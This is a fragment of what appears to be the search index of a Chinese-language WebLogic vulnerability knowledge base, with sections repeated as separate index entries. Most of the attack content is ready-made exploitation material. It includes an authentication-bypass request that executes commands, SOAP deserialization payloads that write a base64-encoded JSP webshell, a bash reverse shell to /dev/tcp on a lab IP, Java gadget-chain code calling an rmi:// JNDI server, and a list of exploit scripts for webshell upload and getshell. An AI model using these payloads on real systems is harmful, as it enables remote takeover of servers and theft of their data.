https://www.freebuf.com/vuls/251540.html https://github.com/QAX-A-Team/WeblogicEnvironment https://paper.seebug.org/1012/#weblogic https://cloud.tencent.com/developer/article/1608010 https://badcode.cc/2018/05/20/WebLogic-%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/ https://paper.seebug.org/1280/#cve-2020-14645 https://www.anquanke.com/post/id/210724","title":"1.4.4 \u5206\u6790\u65b9\u6cd5\u3010\u7701\u7565\u90e8\u5206\u4ee3\u7801\u5206\u6790\u3011"},{"location":"06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Weblogic/Weblogic%20GIOP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/","text":"","title":"Weblogic GIOP\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e"},{"location":"06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Weblogic/Weblogic-2020-14882/","text":"Weblogic\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e-CVE-2020-14882 \u00b6 \u7b80\u4ecb \u00b6 \u672a\u7ecf\u8eab\u4efd\u9a8c\u8bc1\u7684\u8fdc\u7a0b\u653b\u51fb\u8005\u53ef\u80fd\u901a\u8fc7\u6784\u9020\u7279\u6b8a\u7684 HTTP GET\u8bf7\u6c42\uff0c\u5229\u7528\u8be5\u6f0f\u6d1e\u5728\u53d7\u5f71\u54cd\u7684 WebLogic Server \u4e0a\u6267\u884c\u4efb\u610f\u4ee3\u7801\u3002 \u6839\u636e\u8865\u4e01diff\u7ed3\u679c\u6211\u4eec\u53ef\u4ee5\u770b\u51fa\uff0c\u53ef\u4ee5\u770b\u51fa\u4e0a\u9762\u7684\u53d8\u5316 \u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u4e0b\u9762\u7684\u4ee3\u7801\uff0c\u4efb\u610f\u52a0\u8f7d\u67d0\u4e2a\u7c7b\u6216\u8005\u5bf9\u8c61 http://<target>/console/console.portal?_nfpb=true&_pageLabel=HomePage1&handle=java.lang.String(\"ahihi\") \u672a\u6388\u6743\u8bbf\u95ee \u00b6 \u975e\u6cd5\u5b57\u7b26\u7ed5\u8fc7\u767b\u9646\u4fdd\u62a4 POC \u00b6 \u9996\u5148\u901a\u8fc7\u975e\u6cd5\u5b57\u7b26\u7ed5\u8fc7\u8bbf\u95ee\uff0c\u7136\u540e\u901a\u8fc7Gadget\u8c03\u7528\u547d\u4ee4\u6267\u884c\uff0cpoc\u5982\u4e0b GET /console/images/%252E%252E%252Fconsole.portal?_nfpb=true&_pageLabel=HomePage1&handle=com.tangosol.coherence.mvel2.sh.ShellSession(%22java.lang.Runtime.getRuntime().exec(%27calc.exe%27);%22); HTTP/1.1 Host: 192.168.3.189:7001 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:81.0) Gecko/20100101 Firefox/81.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Connection: close Cookie: ADM Upgrade-Insecure-Requests: 1","title":"Weblogic\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e-CVE-2020-14882"},{"location":"06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Weblogic/Weblogic-2020-14882/#weblogic-cve-2020-14882","text":"","title":"Weblogic\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e-CVE-2020-14882"},{"location":"06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Weblogic/Weblogic-2020-14882/#_1","text":"\u672a\u7ecf\u8eab\u4efd\u9a8c\u8bc1\u7684\u8fdc\u7a0b\u653b\u51fb\u8005\u53ef\u80fd\u901a\u8fc7\u6784\u9020\u7279\u6b8a\u7684 HTTP GET\u8bf7\u6c42\uff0c\u5229\u7528\u8be5\u6f0f\u6d1e\u5728\u53d7\u5f71\u54cd\u7684 WebLogic Server \u4e0a\u6267\u884c\u4efb\u610f\u4ee3\u7801\u3002 \u6839\u636e\u8865\u4e01diff\u7ed3\u679c\u6211\u4eec\u53ef\u4ee5\u770b\u51fa\uff0c\u53ef\u4ee5\u770b\u51fa\u4e0a\u9762\u7684\u53d8\u5316 \u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u4e0b\u9762\u7684\u4ee3\u7801\uff0c\u4efb\u610f\u52a0\u8f7d\u67d0\u4e2a\u7c7b\u6216\u8005\u5bf9\u8c61 http://<target>/console/console.portal?_nfpb=true&_pageLabel=HomePage1&handle=java.lang.String(\"ahihi\")","title":"\u7b80\u4ecb"},{"location":"06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Weblogic/Weblogic-2020-14882/#_2","text":"\u975e\u6cd5\u5b57\u7b26\u7ed5\u8fc7\u767b\u9646\u4fdd\u62a4","title":"\u672a\u6388\u6743\u8bbf\u95ee"},{"location":"06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Weblogic/Weblogic-2020-14882/#poc","text":"\u9996\u5148\u901a\u8fc7\u975e\u6cd5\u5b57\u7b26\u7ed5\u8fc7\u8bbf\u95ee\uff0c\u7136\u540e\u901a\u8fc7Gadget\u8c03\u7528\u547d\u4ee4\u6267\u884c\uff0cpoc\u5982\u4e0b GET /console/images/%252E%252E%252Fconsole.portal?_nfpb=true&_pageLabel=HomePage1&handle=com.tangosol.coherence.mvel2.sh.ShellSession(%22java.lang.Runtime.getRuntime().exec(%27calc.exe%27);%22); HTTP/1.1 Host: 192.168.3.189:7001 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:81.0) Gecko/20100101 Firefox/81.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Connection: close Cookie: ADM Upgrade-Insecure-Requests: 1","title":"POC"},{"location":"06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Weblogic/Weblogic%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9ECNVD-C-2019-48814/","text":"\u5f71\u54cd\u8303\u56f4 \u00b6 WebLogic 10.* / WebLogic 12.1.3.0 Docker \u642d\u5efa\u73af\u5883 \u00b6 docker pull ismaleiva90/weblogic12 docker run -d -p 49163:7001 -p 49164:7002 -p 49165:5556 ismaleiva90/weblogic12:latest http://localhost:49163/console User: weblogic Pass: welcome1 http://192.168.247.129:49163/_async/AsyncResponseService \u786e\u5b9a\u76ee\u6807\u7cfb\u7edf\u5bf9\u5916\u5f00\u653e/_async/AsyncResponseService\u8def\u5f84\uff0c\u5b58\u5728\u6b64\u6f0f\u6d1e \u5199\u5165shell POST /_async/AsyncResponseService HTTP/1.1 Host: 192.168.247.129:49163 Content-Length: 1383 Accept-Encoding: gzip, deflate SOAPAction: Accept: */* User-Agent: Apache-HttpClient/4.1.1 (java 1.5) Connection: keep-alive content-type: text/xml <soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:wsa=\"http://www.w3.org/2005/08/addressing\" xmlns:asy=\"http://www.bea.com/async/AsyncResponseService\"> <soapenv:Header> <wsa:Action>xx</wsa:Action> <wsa:RelatesTo>xx</wsa:RelatesTo> <work:WorkContext xmlns:work=\"http://bea.com/2004/06/soap/workarea/\"> <void class=\"java.lang.ProcessBuilder\"> <array class=\"java.lang.String\" length=\"3\"> <void index=\"0\"> <string>/bin/bash</string> </void> <void index=\"1\"> <string>-c</string> </void> <void index=\"2\"> <string>echo PCUKICAgIGlmKCIxMjMiLmVxdWFscyhyZXF1ZXN0LmdldFBhcmFtZXRlcigicHdkIikpKXsKICAgICAgICBqYXZhLmlvLklucHV0U3RyZWFtIGluID0gUnVudGltZS5nZXRSdW50aW1lKCkuZXhlYyhyZXF1ZXN0LmdldFBhcmFtZXRlcigiY21kIikpLmdldElucHV0U3RyZWFtKCk7CiAgICAgICAgaW50IGEgPSAtMTsgICAgICAgICAgCiAgICAgICAgYnl0ZVtdIGIgPSBuZXcgYnl0ZVsxMDI0XTsgICAgICAgICAgCiAgICAgICAgb3V0LnByaW50KCI8cHJlPiIpOyAgICAgICAgICAKICAgICAgICB3aGlsZSgoYT1pbi5yZWFkKGIpKSE9LTEpewogICAgICAgICAgICBvdXQucHJpbnRsbihuZXcgU3RyaW5nKGIpKTsgICAgICAgICAgCiAgICAgICAgfQogICAgICAgIG91dC5wcmludCgiPC9wcmU+Iik7CiAgICB9IAogICAgJT4= |base64 -d > servers/AdminServer/tmp/_WL_internal/bea_wls9_async_response/8tpkys/war/webshell.jsp</string> </void> </array> <void method=\"start\"/></void> </work:WorkContext> </soapenv:Header> <soapenv:Body> <asy:onAsyncDelivery/> </soapenv:Body></soapenv:Envelope> \u8fd9\u91cc\u53ef\u4ee5\u6267\u884c\u547d\u4ee4\u4e86\uff0c\u7136\u540e\u6211\u4eec\u5c1d\u8bd5\u53cd\u5f39shell POST /_async/AsyncResponseService HTTP/1.1 Host: 192.168.247.129:49164 Content-Length: 789 Accept-Encoding: gzip, deflate SOAPAction: Accept: */* User-Agent: Apache-HttpClient/4.1.1 (java 1.5) Connection: keep-alive content-type: text/xml <soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:wsa=\"http://www.w3.org/2005/08/addressing\" xmlns:asy=\"http://www.bea.com/async/AsyncResponseService\"> <soapenv:Header> <wsa:Action>xx</wsa:Action> <wsa:RelatesTo>xx</wsa:RelatesTo> <work:WorkContext xmlns:work=\"http://bea.com/2004/06/soap/workarea/\"> <void class=\"java.lang.ProcessBuilder\"> <array class=\"java.lang.String\" length=\"3\"> <void index=\"0\"> <string>/bin/bash</string> </void> <void index=\"1\"> <string>-c</string> </void> <void index=\"2\"> <string>bash -i >& /dev/tcp/192.168.247.129/12345 0>&1</string> </void> </array> <void method=\"start\"/></void> </work:WorkContext> </soapenv:Header> <soapenv:Body> <asy:onAsyncDelivery/> </soapenv:Body></soapenv:Envelope>","title":"Weblogic\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1eCNVD-C-2019-48814"},{"location":"06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Weblogic/Weblogic%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9ECNVD-C-2019-48814/#_1","text":"WebLogic 10.* / WebLogic 12.1.3.0","title":"\u5f71\u54cd\u8303\u56f4"},{"location":"06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Weblogic/Weblogic%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9ECNVD-C-2019-48814/#docker","text":"docker pull ismaleiva90/weblogic12 docker run -d -p 49163:7001 -p 49164:7002 -p 49165:5556 ismaleiva90/weblogic12:latest http://localhost:49163/console User: weblogic Pass: welcome1 http://192.168.247.129:49163/_async/AsyncResponseService \u786e\u5b9a\u76ee\u6807\u7cfb\u7edf\u5bf9\u5916\u5f00\u653e/_async/AsyncResponseService\u8def\u5f84\uff0c\u5b58\u5728\u6b64\u6f0f\u6d1e \u5199\u5165shell POST /_async/AsyncResponseService HTTP/1.1 Host: 192.168.247.129:49163 Content-Length: 1383 Accept-Encoding: gzip, deflate SOAPAction: Accept: */* User-Agent: Apache-HttpClient/4.1.1 (java 1.5) Connection: keep-alive content-type: text/xml <soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:wsa=\"http://www.w3.org/2005/08/addressing\" xmlns:asy=\"http://www.bea.com/async/AsyncResponseService\"> <soapenv:Header> <wsa:Action>xx</wsa:Action> <wsa:RelatesTo>xx</wsa:RelatesTo> <work:WorkContext xmlns:work=\"http://bea.com/2004/06/soap/workarea/\"> <void class=\"java.lang.ProcessBuilder\"> <array class=\"java.lang.String\" length=\"3\"> <void index=\"0\"> <string>/bin/bash</string> </void> <void index=\"1\"> <string>-c</string> </void> <void index=\"2\"> <string>echo PCUKICAgIGlmKCIxMjMiLmVxdWFscyhyZXF1ZXN0LmdldFBhcmFtZXRlcigicHdkIikpKXsKICAgICAgICBqYXZhLmlvLklucHV0U3RyZWFtIGluID0gUnVudGltZS5nZXRSdW50aW1lKCkuZXhlYyhyZXF1ZXN0LmdldFBhcmFtZXRlcigiY21kIikpLmdldElucHV0U3RyZWFtKCk7CiAgICAgICAgaW50IGEgPSAtMTsgICAgICAgICAgCiAgICAgICAgYnl0ZVtdIGIgPSBuZXcgYnl0ZVsxMDI0XTsgICAgICAgICAgCiAgICAgICAgb3V0LnByaW50KCI8cHJlPiIpOyAgICAgICAgICAKICAgICAgICB3aGlsZSgoYT1pbi5yZWFkKGIpKSE9LTEpewogICAgICAgICAgICBvdXQucHJpbnRsbihuZXcgU3RyaW5nKGIpKTsgICAgICAgICAgCiAgICAgICAgfQogICAgICAgIG91dC5wcmludCgiPC9wcmU+Iik7CiAgICB9IAogICAgJT4= |base64 -d > servers/AdminServer/tmp/_WL_internal/bea_wls9_async_response/8tpkys/war/webshell.jsp</string> </void> </array> <void method=\"start\"/></void> </work:WorkContext> </soapenv:Header> <soapenv:Body> <asy:onAsyncDelivery/> </soapenv:Body></soapenv:Envelope> \u8fd9\u91cc\u53ef\u4ee5\u6267\u884c\u547d\u4ee4\u4e86\uff0c\u7136\u540e\u6211\u4eec\u5c1d\u8bd5\u53cd\u5f39shell POST /_async/AsyncResponseService HTTP/1.1 Host: 192.168.247.129:49164 Content-Length: 789 Accept-Encoding: gzip, deflate SOAPAction: Accept: */* User-Agent: Apache-HttpClient/4.1.1 (java 1.5) Connection: keep-alive content-type: text/xml <soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:wsa=\"http://www.w3.org/2005/08/addressing\" xmlns:asy=\"http://www.bea.com/async/AsyncResponseService\"> <soapenv:Header> <wsa:Action>xx</wsa:Action> <wsa:RelatesTo>xx</wsa:RelatesTo> <work:WorkContext xmlns:work=\"http://bea.com/2004/06/soap/workarea/\"> <void class=\"java.lang.ProcessBuilder\"> <array class=\"java.lang.String\" length=\"3\"> <void index=\"0\"> <string>/bin/bash</string> </void> <void index=\"1\"> <string>-c</string> </void> <void index=\"2\"> <string>bash -i >& /dev/tcp/192.168.247.129/12345 0>&1</string> </void> </array> <void method=\"start\"/></void> </work:WorkContext> </soapenv:Header> <soapenv:Body> <asy:onAsyncDelivery/> </soapenv:Body></soapenv:Envelope>","title":"Docker \u642d\u5efa\u73af\u5883"},{"location":"06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Weblogic/cve%202020-14841%20weblogic%20jndi%E6%B3%A8%E5%85%A5/","text":"cve 2020-14841 weblogic jndi\u6ce8\u5165 \u00b6 \u7b80\u4ecb \u00b6 \u901a\u8fc7diff \u5347\u7ea7\u5305\u4e2dweblogic\u7684\u9ed1\u540d\u5355\uff0c\u6211\u4eec\u53d1\u73b0\u65b0\u589e oracle.eclipselink.coherence.integrated.internal.cache.LockVersionExtractor \u8fd9\u4e2a\u7c7b LockVersionExtractor \u5206\u6790 \u00b6 package oracle.eclipselink.coherence.integrated.internal.cache; import com.tangosol.io.ExternalizableLite; import com.tangosol.io.pof.PofReader; import com.tangosol.io.pof.PofWriter; import com.tangosol.io.pof.PortableObject; import com.tangosol.util.ExternalizableHelper; import com.tangosol.util.ValueExtractor; import java.io.DataInput; import java.io.DataOutput; import java.io.IOException; import oracle.eclipselink.coherence.integrated.cache.Wrapper; import oracle.eclipselink.coherence.integrated.internal.querying.EclipseLinkExtractor; import org.eclipse.persistence.mappings.AttributeAccessor; public class LockVersionExtractor implements ValueExtractor, ExternalizableLite, PortableObject, EclipseLinkExtractor { protected AttributeAccessor accessor; protected String className; public LockVersionExtractor() { } public LockVersionExtractor(AttributeAccessor accessor, String className) { this.accessor = accessor; this.className = className; } public Object extract(Object arg0) { if (arg0 == null) { return null; } else { if (arg0 instanceof Wrapper) { arg0 = ((Wrapper)arg0).unwrap(); } if (!this.accessor.isInitialized()) { this.accessor.initializeAttributes(arg0.getClass()); } return this.accessor.getAttributeValueFromObject(arg0); } } \u6211\u4eec\u53ef\u4ee5\u4ece\u4ee3\u7801\u4e0a\u770b\u51fa\u6765\uff0c\u7c7b\u4f3c\u4e0e cve-2020-2555\uff0c\u7528\u6cd5\u4e5f\u90fd\u662f\u4e00\u6837\u7684\u3002\u89e6\u53d1\u6f0f\u6d1e\u7684\u91cd\u70b9\u5728\u4e8ethis.accessor.getAttributeValueFromObject \u4e2d\u3002\u4e0b\u9762\u9009\u53d6\u4e00\u4e2a\u53ef\u80fd\u7684\u6267\u884c\u8def\u5f84 package org.eclipse.persistence.internal.descriptors; public class MethodAttributeAccessor extends AttributeAccessor { protected String setMethodName = \"\"; protected String getMethodName; protected transient Method setMethod; protected transient Method getMethod; public Object getAttributeValueFromObject(Object anObject) throws DescriptorException { return this.getAttributeValueFromObject(anObject, (Object[])null); } protected Object getAttributeValueFromObject(Object anObject, Object[] parameters) throws DescriptorException { try { if (PrivilegedAccessHelper.shouldUsePrivilegedAccess()) { try { return AccessController.doPrivileged(new PrivilegedMethodInvoker(this.getGetMethod(), anObject, parameters)); } catch (PrivilegedActionException var5) { Exception throwableException = var5.getException(); if (throwableException instanceof IllegalAccessException) { throw DescriptorException.illegalAccessWhileGettingValueThruMethodAccessor(this.getGetMethodName(), anObject.getClass().getName(), throwableException); } else { throw DescriptorException.targetInvocationWhileGettingValueThruMethodAccessor(this.getGetMethodName(), anObject.getClass().getName(), throwableException); } } } else { return this.getMethod.invoke(anObject, parameters); } MethodAttributeAccessor\u4e2dgetAttributeValueFromObject\u51fd\u6570\u7f3a\u70b9\u5728\u4e8e\uff0c\u53ea\u80fd\u6267\u884c\u65e0\u53c2\u7684\u51fd\u6570\uff0c\u4ece\u8fd9\u70b9\u6765\u770b\uff0c\u6211\u4eec\u5f88\u5bb9\u6613\u7684\u4e0e\u4e03\u6708\u4efd cve-2020-14645 \u8054\u60f3\u8d77\u6765 POC \u00b6 // JdbcRowSetImpl JdbcRowSetImpl jdbcRowSet = new JdbcRowSetImpl(); jdbcRowSet.setDataSourceName(\"rmi://192.168.3.254:8888/xsmd\"); MethodAttributeAccessor methodAttributeAccessor = new MethodAttributeAccessor(); methodAttributeAccessor.setGetMethodName(\"getDatabaseMetaData\"); methodAttributeAccessor.setIsWriteOnly(true); methodAttributeAccessor.setAttributeName(\"UnicodeSec\"); LockVersionExtractor extractor = new LockVersionExtractor(methodAttributeAccessor, \"UnicodeSec\"); final ExtractorComparator comparator = new ExtractorComparator(extractor); final PriorityQueue<Object> queue = new PriorityQueue<Object>(2, comparator); Object[] q = new Object[]{jdbcRowSet, jdbcRowSet}; Reflections.setFieldValue(queue, \"queue\", q); Reflections.setFieldValue(queue, \"size\", 2); Field comparatorF = queue.getClass().getDeclaredField(\"comparator\"); comparatorF.setAccessible(true); comparatorF.set(queue, new ExtractorComparator(extractor));","title":"Cve 2020 14841 weblogic jndi\u6ce8\u5165"},{"location":"06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Weblogic/cve%202020-14841%20weblogic%20jndi%E6%B3%A8%E5%85%A5/#cve-2020-14841-weblogic-jndi","text":"","title":"cve 2020-14841 weblogic jndi\u6ce8\u5165"},{"location":"06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Weblogic/cve%202020-14841%20weblogic%20jndi%E6%B3%A8%E5%85%A5/#_1","text":"\u901a\u8fc7diff \u5347\u7ea7\u5305\u4e2dweblogic\u7684\u9ed1\u540d\u5355\uff0c\u6211\u4eec\u53d1\u73b0\u65b0\u589e oracle.eclipselink.coherence.integrated.internal.cache.LockVersionExtractor \u8fd9\u4e2a\u7c7b","title":"\u7b80\u4ecb"},{"location":"06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Weblogic/cve%202020-14841%20weblogic%20jndi%E6%B3%A8%E5%85%A5/#lockversionextractor","text":"package oracle.eclipselink.coherence.integrated.internal.cache; import com.tangosol.io.ExternalizableLite; import com.tangosol.io.pof.PofReader; import com.tangosol.io.pof.PofWriter; import com.tangosol.io.pof.PortableObject; import com.tangosol.util.ExternalizableHelper; import com.tangosol.util.ValueExtractor; import java.io.DataInput; import java.io.DataOutput; import java.io.IOException; import oracle.eclipselink.coherence.integrated.cache.Wrapper; import oracle.eclipselink.coherence.integrated.internal.querying.EclipseLinkExtractor; import org.eclipse.persistence.mappings.AttributeAccessor; public class LockVersionExtractor implements ValueExtractor, ExternalizableLite, PortableObject, EclipseLinkExtractor { protected AttributeAccessor accessor; protected String className; public LockVersionExtractor() { } public LockVersionExtractor(AttributeAccessor accessor, String className) { this.accessor = accessor; this.className = className; } public Object extract(Object arg0) { if (arg0 == null) { return null; } else { if (arg0 instanceof Wrapper) { arg0 = ((Wrapper)arg0).unwrap(); } if (!this.accessor.isInitialized()) { this.accessor.initializeAttributes(arg0.getClass()); } return this.accessor.getAttributeValueFromObject(arg0); } } \u6211\u4eec\u53ef\u4ee5\u4ece\u4ee3\u7801\u4e0a\u770b\u51fa\u6765\uff0c\u7c7b\u4f3c\u4e0e cve-2020-2555\uff0c\u7528\u6cd5\u4e5f\u90fd\u662f\u4e00\u6837\u7684\u3002\u89e6\u53d1\u6f0f\u6d1e\u7684\u91cd\u70b9\u5728\u4e8ethis.accessor.getAttributeValueFromObject \u4e2d\u3002\u4e0b\u9762\u9009\u53d6\u4e00\u4e2a\u53ef\u80fd\u7684\u6267\u884c\u8def\u5f84 package org.eclipse.persistence.internal.descriptors; public class MethodAttributeAccessor extends AttributeAccessor { protected String setMethodName = \"\"; protected String getMethodName; protected transient Method setMethod; protected transient Method getMethod; public Object getAttributeValueFromObject(Object anObject) throws DescriptorException { return this.getAttributeValueFromObject(anObject, (Object[])null); } protected Object getAttributeValueFromObject(Object anObject, Object[] parameters) throws DescriptorException { try { if (PrivilegedAccessHelper.shouldUsePrivilegedAccess()) { try { return AccessController.doPrivileged(new PrivilegedMethodInvoker(this.getGetMethod(), anObject, parameters)); } catch (PrivilegedActionException var5) { Exception throwableException = var5.getException(); if (throwableException instanceof IllegalAccessException) { throw DescriptorException.illegalAccessWhileGettingValueThruMethodAccessor(this.getGetMethodName(), anObject.getClass().getName(), throwableException); } else { throw DescriptorException.targetInvocationWhileGettingValueThruMethodAccessor(this.getGetMethodName(), anObject.getClass().getName(), throwableException); } } } else { return this.getMethod.invoke(anObject, parameters); } MethodAttributeAccessor\u4e2dgetAttributeValueFromObject\u51fd\u6570\u7f3a\u70b9\u5728\u4e8e\uff0c\u53ea\u80fd\u6267\u884c\u65e0\u53c2\u7684\u51fd\u6570\uff0c\u4ece\u8fd9\u70b9\u6765\u770b\uff0c\u6211\u4eec\u5f88\u5bb9\u6613\u7684\u4e0e\u4e03\u6708\u4efd cve-2020-14645 \u8054\u60f3\u8d77\u6765","title":"LockVersionExtractor \u5206\u6790"},{"location":"06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Weblogic/cve%202020-14841%20weblogic%20jndi%E6%B3%A8%E5%85%A5/#poc","text":"// JdbcRowSetImpl JdbcRowSetImpl jdbcRowSet = new JdbcRowSetImpl(); jdbcRowSet.setDataSourceName(\"rmi://192.168.3.254:8888/xsmd\"); MethodAttributeAccessor methodAttributeAccessor = new MethodAttributeAccessor(); methodAttributeAccessor.setGetMethodName(\"getDatabaseMetaData\"); methodAttributeAccessor.setIsWriteOnly(true); methodAttributeAccessor.setAttributeName(\"UnicodeSec\"); LockVersionExtractor extractor = new LockVersionExtractor(methodAttributeAccessor, \"UnicodeSec\"); final ExtractorComparator comparator = new ExtractorComparator(extractor); final PriorityQueue<Object> queue = new PriorityQueue<Object>(2, comparator); Object[] q = new Object[]{jdbcRowSet, jdbcRowSet}; Reflections.setFieldValue(queue, \"queue\", q); Reflections.setFieldValue(queue, \"size\", 2); Field comparatorF = queue.getClass().getDeclaredField(\"comparator\"); comparatorF.setAccessible(true); comparatorF.set(queue, new ExtractorComparator(extractor));","title":"POC"},{"location":"06-%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E/Weblogic/readme/","text":"About Oracle Weblogic \u00b6 WebLogic\u662f\u7f8e\u56fdOracle\u516c\u53f8\u51fa\u54c1\u7684\u4e00\u4e2aapplication server\uff0c\u786e\u5207\u7684\u8bf4\u662f\u4e00\u4e2a\u57fa\u4e8eJAVAEE\u67b6\u6784\u7684\u4e2d\u95f4\u4ef6\uff0cWebLogic\u662f\u7528\u4e8e\u5f00\u53d1\u3001\u96c6\u6210\u3001\u90e8\u7f72\u548c\u7ba1\u7406\u5927\u578b\u5206\u5e03\u5f0fWeb\u5e94\u7528\u3001\u7f51\u7edc\u5e94\u7528\u548c\u6570\u636e\u5e93\u5e94\u7528\u7684Java\u5e94\u7528\u670d\u52a1\u5668\u3002\u5c06Java\u7684\u52a8\u6001\u529f\u80fd\u548cJava Enterprise\u6807\u51c6\u7684\u5b89\u5168\u6027\u5f15\u5165\u5927\u578b\u7f51\u7edc\u5e94\u7528\u7684\u5f00\u53d1\u3001\u96c6\u6210\u3001\u90e8\u7f72\u548c\u7ba1\u7406\u4e4b\u4e2d\u3002 Vulnerability list \u00b6 cve-2014-4210_ssrf_scan.py Weblogic SSRF \u626b\u63cf\u5185\u7f51\u7aef\u53e3\u5229\u7528\u811a\u672c [\u4f7f\u7528] cve-2014-4210_ssrf_redis_shell.py Weblogic SSRF\u6f0f\u6d1e\u5185\u7f51redis\u672a\u6388\u6743getshell\u811a\u672c [\u4f7f\u7528] cve-2017-3506_poc.py Weblogic wls-wsat \u8fdc\u7a0b\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e\u68c0\u6d4b\u811a\u672c [\u4f7f\u7528] cve-2017-3506_webshell.jar Weblogic wls-wsat \u8fdc\u7a0b\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e\u5229\u7528\uff0c\u4e0a\u4f20Webshell [\u4f7f\u7528] cve-2017-10271_poc.jar Weblogic wls-wsat XMLDecoder \u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e [\u4f7f\u7528] cve-2017-10271_webshell.jar Weblogic wls-wsat XMLDecoder \u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\u5229\u7528\u811a\u672c [\u4f7f\u7528] cve-2018-2628_poc.py Weblogic WLS Core Components \u53cd\u5e8f\u5217\u5316\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e\u9a8c\u8bc1\u811a\u672c [\u4f7f\u7528] cve-2018-2628_webshell.py Weblogic WLS Core Components \u547d\u4ee4\u6267\u884c\u6f0f\u6d1e\u4e0a\u4f20Webshell\u811a\u672c [\u4f7f\u7528] cve-2018-2893_poc.py WebLogic WLS \u6838\u5fc3\u7ec4\u4ef6\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\u68c0\u6d4b\u811a\u672c cve-2018-2893_cmd.py WebLogic WLS \u6838\u5fc3\u7ec4\u4ef6\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\u5229\u7528\u811a\u672c cve-2018-2894_poc_exp.py Weblogic \u4efb\u610f\u6587\u4ef6\u4e0a\u4f20\u6f0f\u6d1e\u68c0\u6d4b+\u5229\u7528 cve-2019-2618_webshell.py Weblogic \u4efb\u610f\u6587\u4ef6\u4e0a\u4f20\u6f0f\u6d1e(\u9700\u8981\u8d26\u6237\u5bc6\u7801) [\u4f7f\u7528] cve-2020-2551_poc.py Weblogic IIOP \u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\u68c0\u6d4b\u811a\u672c Readme \u00b6 \u90e8\u5206\u811a\u672c\u6587\u4ef6\u4f7f\u7528\u8bf4\u660e\uff0c\u8be6\u7ec6\u4f7f\u7528\u5206\u6790\u8bf7\u53c2\u8003 vulnerability-list \u4e2d\u7684[\u4f7f\u7528] - VER: \u6f0f\u6d1e\u5f71\u54cd\u7248\u672c\uff0c\u4e00\u822c\u60c5\u51b5\u4e0b\u4e0d\u5728\u5f71\u54cd\u8303\u56f4\u7684\u7248\u672c\u6ca1\u6709\u76f8\u5173\u6f0f\u6d1e - USE: \u811a\u672c\u6587\u4ef6\u4f7f\u7528\u8bf4\u660e\uff0c\u5927\u90e8\u5206\u5199\u5728\u4e86\u811a\u672c\u91cc\uff0c\u6267\u884c\u5373\u53ef\u89c1 - EXP: \u811a\u672c\u5229\u7528\u793a\u4f8b\uff0c\u4ee5\u53ca\u6267\u884c\u6548\u679c - DES: \u90e8\u5206\u7279\u6b8a\u811a\u672c\u6587\u4ef6\u7684\u7279\u6b8a\u63cf\u8ff0 CVE-2014-4210_ssrf_scan.py Weblogic SSRF \u6f0f\u6d1e\u626b\u63cf\u5185\u7f51\u7aef\u53e3 \u00b6 VER: Weblogic 